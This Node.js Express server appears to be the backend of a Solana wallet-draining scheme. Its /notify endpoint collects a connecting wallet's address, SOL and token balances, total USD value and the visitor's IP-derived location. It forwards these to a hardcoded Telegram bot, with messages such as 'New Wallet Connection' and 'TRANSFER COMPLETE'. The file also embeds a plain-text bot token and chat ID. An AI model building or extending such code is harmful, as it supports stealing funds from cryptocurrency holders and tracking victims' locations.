const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================
// CONFIGURATION
// ============================================
const BOT_TOKEN = "8731239008:AAFr0vodZ-JYBExut1j7HNPRHWjZFMSQqHY";
const CHAT_ID = "8520547580";

let cachedSolPrice = null;
let lastPriceUpdate = 0;
const PRICE_CACHE_DURATION = 30 * 60 * 1000; // 30 minutes

// Token mint -> symbol mapping (shared with frontend)
const TOKEN_SYMBOLS = {
    'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
    'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
    'So11111111111111111111111111111111111111112': 'SOL',
    'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
    'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
    'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL'
};

// ============================================
// HELPER FUNCTIONS
// ============================================

function getCountryFlag(countryCode) {
    if (!countryCode) return '🌍';
    const flags = {
        'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
        'FR': '🇫🇷', 'JP': '🇯🇵', 'KR': '🇰🇷', 'CN': '🇨🇳', 'IN': '🇮🇳',
        'BR': '🇧🇷', 'RU': '🇷🇺', 'IT': '🇮🇹', 'ES': '🇪🇸', 'NL': '🇳🇱',
        'SE': '🇸🇪', 'NO': '🇳🇴', 'SG': '🇸🇬', 'CH': '🇨🇭', 'TR': '🇹🇷'
    };
    return flags[countryCode] || '🌍';
}

async function getIPLocation(ip) {
    try {
        const response = await axios.get(`http://ip-api.com/json/${ip}`);
        const data = response.data;
        if (data.status === 'success') {
            return {
                country: data.country,
                countryCode: data.countryCode,
                region: data.regionName,
                city: data.city,
                flag: getCountryFlag(data.countryCode)
            };
        }
    } catch (error) {
        console.error('IP geolocation error:', error);
    }
    return null;
}

async function getSolPrice() {
    const now = Date.now();
    
    if (cachedSolPrice && (now - lastPriceUpdate) < PRICE_CACHE_DURATION) {
        return cachedSolPrice;
    }
    
    try {
        const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
        cachedSolPrice = response.data.solana.usd;
        lastPriceUpdate = now;
        console.log(`SOL price updated: $${cachedSolPrice}`);
        return cachedSolPrice;
    } catch (error) {
        console.error('Error fetching SOL price:', error.message);
        return cachedSolPrice || 0;
    }
}

function escapeMarkdown(text) {
    if (!text) return '';
    const specialChars = /[_*[\]()~`>#+=|{}.!-]/g;
    return text.replace(specialChars, '\\$&');
}

// ============================================
// TELEGRAM NOTIFICATION ENDPOINT
// ============================================

app.post('/notify', async (req, res) => {
    try {
        const { address, balance, walletType, customMessage, splTokens, ip } = req.body;
        
        // Get client IP
        let clientIP = ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        if (clientIP && clientIP.includes(',')) {
            clientIP = clientIP.split(',')[0].trim();
        }
        
        const locationInfo = await getIPLocation(clientIP);
        const solPrice = await getSolPrice();
        
        // Calculate total USD value
        const solBalance = parseFloat(balance) || 0;
        let totalUSD = solBalance * solPrice;
        let splTokensStr = '';
        
        if (splTokens && splTokens.length > 0) {
            splTokensStr = '\n💎 Tokens:\n';
            for (const token of splTokens) {
                const tokenValue = token.usdValue || 0;
                totalUSD += tokenValue;
                splTokensStr += `• ${token.symbol}: ${token.balance} ($${tokenValue.toFixed(2)})\n`;
            }
        }
        
        const shortAddress = address ? `${address.slice(0, 6)}...${address.slice(-4)}` : 'Unknown';
        const locationStr = locationInfo ? `${locationInfo.flag} ${locationInfo.city || ''} ${locationInfo.country || ''}` : '🌍 Unknown';
        
        let text;
        if (customMessage) {
            if (customMessage.includes('🔗 Wallet Connected')) {
                text = `🔗 New Wallet Connection\n\n` +
                       `💰 Total Value: $${totalUSD.toFixed(2)}\n` +
                       `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
                       `🔄 Type: ${walletType || 'Unknown'}\n` +
                       `💎 SOL: ${balance} SOL ($${(solBalance * solPrice).toFixed(2)})${splTokensStr}\n` +
                       `📍 ${locationStr}\n` +
                       `🕒 ${new Date().toLocaleString()}`;
            } else if (customMessage.includes('✅')) {
                text = `✅ ${customMessage}\n\n` +
                       `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
                       `💰 Value: $${totalUSD.toFixed(2)}${splTokensStr}\n` +
                       `📍 ${locationStr}`;
            } else if (customMessage.includes('🎉')) {
                text = `🎉 TRANSFER COMPLETE\n\n` +
                       `${customMessage}\n\n` +
                       `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
                       `💰 Total Value: $${totalUSD.toFixed(2)}${splTokensStr}\n` +
                       `📍 ${locationStr}`;
            } else {
                text = `${customMessage}\n\n` +
                       `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
                       `💰 SOL: ${balance} SOL ($${(solBalance * solPrice).toFixed(2)})${splTokensStr}\n` +
                       `📍 ${locationStr}`;
            }
        } else {
            text = `🔗 New Wallet Connection\n\n` +
                   `💰 Total Value: $${totalUSD.toFixed(2)}\n` +
                   `👛 Wallet: \`${escapeMarkdown(shortAddress)}\`\n` +
                   `💎 SOL: ${balance} SOL ($${(solBalance * solPrice).toFixed(2)})${splTokensStr}\n` +
                   `📍 ${locationStr}`;
        }
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            disable_web_page_preview: false
        });
        
        res.json({ ok: true });
    } catch (error) {
        console.error('Telegram error:', error.response?.data || error.message);
        res.status(500).json({ error: "Notification failed" });
    }
});

// ============================================
// HEALTH CHECK
// ============================================

app.get('/health', (req, res) => {
    res.json({ status: 'ok', solPrice: cachedSolPrice });
});

// ============================================
// SERVER STARTUP
// ============================================

const PORT = 5000;
app.listen(PORT, '0.0.0.0', async () => {
    console.log(`Server running on port ${PORT}`);
    await getSolPrice(); // Initialize price cache
    
    // Start price updater
    setInterval(async () => {
        console.log('Updating SOL price...');
        await getSolPrice();
    }, PRICE_CACHE_DURATION);
});
